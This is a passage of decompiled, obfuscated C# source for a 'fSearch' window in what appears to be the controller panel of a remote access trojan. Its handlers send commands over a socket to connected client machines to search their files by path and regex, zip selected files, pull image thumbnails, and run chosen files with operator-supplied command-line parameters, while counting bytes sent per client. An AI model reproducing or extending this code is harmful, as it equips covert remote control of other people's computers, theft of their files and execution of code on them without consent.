					cFileSearch cFileSearch2 = (cFileSearch)obj;
					text = text + cFileSearch2.TAG + "|";
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			string text2 = "files_zip|" + text;
			long num = 0L;
			ref string ptr = ref text2;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}
	}

	// Token: 0x06001955 RID: 6485 RVA: 0x00041BE8 File Offset: 0x0003FDE8
	private void method_21(object sender, EventArgs e)
	{
		Class130.fTransferManager_0.Visible = true;
		Form fTransferManager_ = Class130.fTransferManager_0;
		bool flag = false;
		Form form = fTransferManager_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fTransferManager_0.Opacity = 100.0;
			Class130.fTransferManager_0.Activate();
		}
	}

	// Token: 0x06001956 RID: 6486 RVA: 0x000B72B8 File Offset: 0x000B54B8
	private void method_22(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cFileSearch cFileSearch = (cFileSearch)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cFileSearch.NAME,
						"\t",
						cFileSearch.SIZE,
						"\t",
						cFileSearch.TYPE,
						"\t",
						cFileSearch.ATTR,
						"\t",
						cFileSearch.LMOD,
						"\t",
						cFileSearch.PATH,
						"\t",
						cFileSearch.STATUS,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06001957 RID: 6487 RVA: 0x000B73EC File Offset: 0x000B55EC
	private void method_23(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_6();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cFileSearch cFileSearch = (cFileSearch)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cFileSearch.NAME,
					"\t",
					cFileSearch.SIZE,
					"\t",
					cFileSearch.TYPE,
					"\t",
					cFileSearch.ATTR,
					"\t",
					cFileSearch.LMOD,
					"\t",
					cFileSearch.PATH,
					"\t",
					cFileSearch.STATUS
				}));
				stringBuilder.Append("\r\n");
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06001958 RID: 6488 RVA: 0x0000CB09 File Offset: 0x0000AD09
	private void method_24(object sender, EventArgs e)
	{
		this.concurrentStack_0.Clear();
		this.vmethod_6().ClearObjects();
	}

	// Token: 0x06001959 RID: 6489 RVA: 0x000B7514 File Offset: 0x000B5714
	private void method_25(object sender, EventArgs e)
	{
		string text = string.Empty;
		FastObjectListView fastObjectListView = this.vmethod_6();
		try
		{
			IEnumerator enumerator = fastObjectListView.SelectedObjects.GetEnumerator();
			if (enumerator.MoveNext())
			{
				text = ((cFileSearch)enumerator.Current).TAG;
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (Operators.CompareString(text, string.Empty, true) == 0)
		{
			Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
		ConcurrentDictionary<string, CClient> concurrentDictionary_;
		string key;
		CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_0];
		string text3 = string.Concat(new string[]
		{
			"files_exec|",
			text,
			"|",
			text2,
			"|0"
		});
		long num = 0L;
		ref string ptr = ref text3;
		ref CClient ptr2 = ref value;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary_[key] = value;
	}

	// Token: 0x0600195A RID: 6490 RVA: 0x000B76D0 File Offset: 0x000B58D0
	public void method_26(int int_1)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fSearch.Delegate199(this.method_26), new object[]
			{
				int_1
			});
			return;
		}
		base.Opacity = Conversion.Val((double)this.int_0 / 100.0);
	}

	// Token: 0x0600195B RID: 6491 RVA: 0x000B772C File Offset: 0x000B592C
	private void method_27(object sender, DoWorkEventArgs e)
	{
		while (this.int_0 < 100)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 5);
			this.method_26(this.int_0);
			Thread.Sleep(1);
		}
	}

	// Token: 0x0600195C RID: 6492 RVA: 0x0000CB21 File Offset: 0x0000AD21
	private void method_28(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_4();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x0600195D RID: 6493 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_29(object sender, EventArgs e)
	{
	}

	// Token: 0x0600195E RID: 6494 RVA: 0x000B7768 File Offset: 0x000B5968
	private void method_30(object sender, EventArgs e)
	{
		if (Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0 == null)
		{
			Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0 = new fThumb();
			Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.Opacity = 0.0;
			Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.Show();
		}
		else
		{
			Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.method_3();
		}
		if (Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0 != null)
		{
			FastObjectListView fastObjectListView = this.vmethod_6();
			if (fastObjectListView.SelectedObjects.Count > 0)
			{
				cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
				if (Class136.smethod_5(cFileSearch.NAME))
				{
					Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.method_0(cFileSearch.NAME, this.string_4, this.string_5, this.string_6, this.string_7);
					string text = this.string_0;
					string text2 = string.Concat(new string[]
					{
						"thumb_data|",
						cFileSearch.TAG,
						"|",
						Class130.fSettings_0.vmethod_92().Text,
						"|",
						Class130.fSettings_0.vmethod_86().Text
					});
					string text3 = text;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.method_1();
				}
			}
		}
	}

	// Token: 0x0600195F RID: 6495 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_31(object sender, EventArgs e)
	{
	}

	// Token: 0x06001960 RID: 6496 RVA: 0x000B7998 File Offset: 0x000B5B98
	private void method_32(object sender, FormatRowEventArgs e)
	{
		try
		{
			if (((cFileSearch)e.Model).STATUS.Length > 0)
			{
				e.Item.ForeColor = Color.Red;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001961 RID: 6497 RVA: 0x0000CB34 File Offset: 0x0000AD34
	private void method_33(object sender, EventArgs e)
	{
		this.vmethod_30().Text = ".*\\.gif|.jpe?g|.tiff|.png|.bmp$";
	}

	// Token: 0x06001962 RID: 6498 RVA: 0x000B79F0 File Offset: 0x000B5BF0
	private void method_34(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_114().Text, "Search", true) == 0)
		{
			this.concurrentStack_0.Clear();
			this.vmethod_6().ClearObjects();
			Class130.concurrentDictionary_3[this.string_0].SCREEN_IS_STREAMING = true;
			string text = this.string_0;
			string text2 = "files_search|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_24().Text)) + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_30().Text));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			this.vmethod_34().Text = "Status: Search started";
			this.vmethod_24().Enabled = false;
			this.vmethod_30().Enabled = false;
			this.vmethod_112().Enabled = false;
			this.vmethod_114().Text = "Stop";
			return;
		}
		if (Operators.CompareString(this.vmethod_114().Text, "Stop", true) == 0)
		{
			this.vmethod_114().Enabled = false;
			string text4 = this.string_0;
			string text2 = "files_search_stop|1";
			string text3 = text4;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x06001963 RID: 6499 RVA: 0x000B7BD8 File Offset: 0x000B5DD8
	private void method_35(object sender, EventArgs e)
	{
		if (Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0 != null && Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.Visible)
		{
			FastObjectListView fastObjectListView = this.vmethod_6();
			if (fastObjectListView.SelectedObjects.Count > 0)
			{
				cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
				if (Class136.smethod_5(cFileSearch.NAME))
				{
					Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.method_0(cFileSearch.NAME, this.string_4, this.string_5, this.string_6, this.string_7);
					string text = this.string_0;
					string text2 = string.Concat(new string[]
					{
						"thumb_data|",
						cFileSearch.TAG,
						"|",
						Class130.fSettings_0.vmethod_92().Text,
						"|",
						Class130.fSettings_0.vmethod_86().Text
					});
					string text3 = text;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					Class130.concurrentDictionary_3[this.string_0].fDB.fThumb_0.method_1();
				}
			}
		}
	}

	// Token: 0x06001964 RID: 6500 RVA: 0x000B7D8C File Offset: 0x000B5F8C
	private void method_36(object sender, MouseEventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_6();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			cFileSearch cFileSearch = (cFileSearch)fastObjectListView.SelectedObjects[0];
			this.vmethod_110().Enabled = Conversions.ToBoolean(Interaction.IIf(Class136.smethod_5(cFileSearch.NAME), true, false));
		}
	}

	// Token: 0x04000938 RID: 2360
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x04000939 RID: 2361
	private StatusStrip statusStrip_0;

	// Token: 0x0400093A RID: 2362
	private Panel panel_0;

	// Token: 0x0400093B RID: 2363
	private FastObjectListView fastObjectListView_0;

	// Token: 0x0400093C RID: 2364
	private OLVColumn olvcolumn_0;

	// Token: 0x0400093D RID: 2365
	private OLVColumn olvcolumn_1;

	// Token: 0x0400093E RID: 2366
	private OLVColumn olvcolumn_2;

	// Token: 0x0400093F RID: 2367
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x04000940 RID: 2368
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x04000941 RID: 2369
	private OLVColumn olvcolumn_3;

	// Token: 0x04000942 RID: 2370
	private OLVColumn olvcolumn_4;

	// Token: 0x04000943 RID: 2371
	private OLVColumn olvcolumn_5;

	// Token: 0x04000944 RID: 2372
	private TextBox textBox_0;

	// Token: 0x04000945 RID: 2373
	private Label label_0;

	// Token: 0x04000946 RID: 2374
	private Label label_1;

	// Token: 0x04000947 RID: 2375
	private TextBox textBox_1;

	// Token: 0x04000948 RID: 2376
	private OLVColumn olvcolumn_6;

	// Token: 0x04000949 RID: 2377
	private Label label_2;

	// Token: 0x0400094A RID: 2378
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x0400094B RID: 2379
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x0400094C RID: 2380
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x0400094D RID: 2381
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x0400094E RID: 2382
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x0400094F RID: 2383
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x04000950 RID: 2384
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x04000951 RID: 2385
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x04000952 RID: 2386
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x04000953 RID: 2387
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x04000954 RID: 2388
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x04000955 RID: 2389
	private ToolStripMenuItem toolStripMenuItem_8;

	// Token: 0x04000956 RID: 2390
	private ToolStripMenuItem toolStripMenuItem_9;

	// Token: 0x04000957 RID: 2391
	private ToolStripMenuItem toolStripMenuItem_10;

	// Token: 0x04000958 RID: 2392
	private ToolStripMenuItem toolStripMenuItem_11;

	// Token: 0x04000959 RID: 2393
	private ToolStripMenuItem toolStripMenuItem_12;

	// Token: 0x0400095A RID: 2394
	private ToolStripMenuItem toolStripMenuItem_13;

	// Token: 0x0400095B RID: 2395
	private ToolStripMenuItem toolStripMenuItem_14;

	// Token: 0x0400095C RID: 2396
	private ToolStripMenuItem toolStripMenuItem_15;

	// Token: 0x0400095D RID: 2397
	private ToolStripMenuItem toolStripMenuItem_16;

	// Token: 0x0400095E RID: 2398
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x0400095F RID: 2399
	private ToolStripMenuItem toolStripMenuItem_17;

	// Token: 0x04000960 RID: 2400
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x04000961 RID: 2401
	private ToolStripMenuItem toolStripMenuItem_18;

	// Token: 0x04000962 RID: 2402
	private ToolStripMenuItem toolStripMenuItem_19;

	// Token: 0x04000963 RID: 2403
	private ToolStripSeparator toolStripSeparator_4;

	// Token: 0x04000964 RID: 2404
	private ToolStripMenuItem toolStripMenuItem_20;

	// Token: 0x04000965 RID: 2405
	private ToolStripMenuItem toolStripMenuItem_21;

	// Token: 0x04000966 RID: 2406
	private ToolStripSeparator toolStripSeparator_5;

	// Token: 0x04000967 RID: 2407
	private ToolStripMenuItem toolStripMenuItem_22;

	// Token: 0x04000968 RID: 2408
	private ToolStripMenuItem toolStripMenuItem_23;

	// Token: 0x04000969 RID: 2409
	private ToolStripSeparator toolStripSeparator_6;

	// Token: 0x0400096A RID: 2410
	private ToolStripMenuItem toolStripMenuItem_24;

	// Token: 0x0400096B RID: 2411
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x0400096C RID: 2412
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x0400096D RID: 2413
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x0400096E RID: 2414
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x0400096F RID: 2415
	private ToolStripMenuItem toolStripMenuItem_25;

	// Token: 0x04000970 RID: 2416
	private VisualButton visualButton_0;

	// Token: 0x04000971 RID: 2417
	private VisualButton visualButton_1;

	// Token: 0x04000972 RID: 2418
	public string string_0;

	// Token: 0x04000973 RID: 2419
	public string string_1;

	// Token: 0x04000974 RID: 2420
	public string string_2;

	// Token: 0x04000975 RID: 2421
	public string string_3;

	// Token: 0x04000976 RID: 2422
	public string string_4;

	// Token: 0x04000977 RID: 2423
	public string string_5;

	// Token: 0x04000978 RID: 2424
	public string string_6;

	// Token: 0x04000979 RID: 2425
	public string string_7;

	// Token: 0x0400097A RID: 2426
	private int int_0;

	// Token: 0x0400097B RID: 2427
	public ConcurrentStack<cFileSearch> concurrentStack_0;

	// Token: 0x020001C8 RID: 456
	// (Invoke) Token: 0x06001968 RID: 6504
	private delegate void Delegate191(string string_0);

	// Token: 0x020001C9 RID: 457
	// (Invoke) Token: 0x0600196C RID: 6508
	private delegate void Delegate192(bool bool_0, string string_0);

	// Token: 0x020001CA RID: 458
	// (Invoke) Token: 0x06001970 RID: 6512
	private delegate void Delegate193();

	// Token: 0x020001CB RID: 459
	// (Invoke) Token: 0x06001974 RID: 6516
	private delegate void Delegate194(string string_0);

	// Token: 0x020001CC RID: 460
	// (Invoke) Token: 0x06001978 RID: 6520
	private delegate void Delegate195(string string_0);

	// Token: 0x020001CD RID: 461
	// (Invoke) Token: 0x0600197C RID: 6524
	private delegate void Delegate196(string string_0);

	// Token: 0x020001CE RID: 462
	// (Invoke) Token: 0x06001980 RID: 6528
	private delegate void Delegate197();

	// Token: 0x020001CF RID: 463
	// (Invoke) Token: 0x06001984 RID: 6532
	private delegate void Delegate198(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6, string string_7);

	// Token: 0x020001D0 RID: 464
	// (Invoke) Token: 0x06001988 RID: 6536
	private delegate void Delegate199(int int_0);

	// Token: 0x020001D1 RID: 465
	// (Invoke) Token: 0x0600198C RID: 6540
	private delegate void Delegate200();
}
